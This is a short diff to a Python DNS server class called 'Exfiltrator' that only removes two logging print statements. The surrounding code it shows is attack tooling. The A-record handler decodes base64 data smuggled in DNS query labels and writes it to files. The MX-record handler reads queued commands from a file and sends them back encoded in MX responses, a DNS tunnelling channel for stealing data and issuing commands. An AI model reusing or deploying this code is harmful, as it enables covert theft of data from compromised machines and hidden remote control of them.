@@ -32,7 +32,6 @@ class Exfiltrator(BaseRequestHandler, object):
 	q = name.label
         with open(q[1], 'a+b') as f:
             f.write(base64.b64decode(q[0]))
-	print("A Record: {r}".format(r=str(name)))
 	return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
     def _MX(self, name):
         '''
@@ -41,7 +40,6 @@ class Exfiltrator(BaseRequestHandler, object):
 	'''
 	with open(CMD_FILE) as f:
 	    cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
-	print("MX Record: {r} sending {c}".format(r=str(name), c=cmd))
 	return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)
     def handle(self):
         request = DNSRecord.parse(self.request[0])
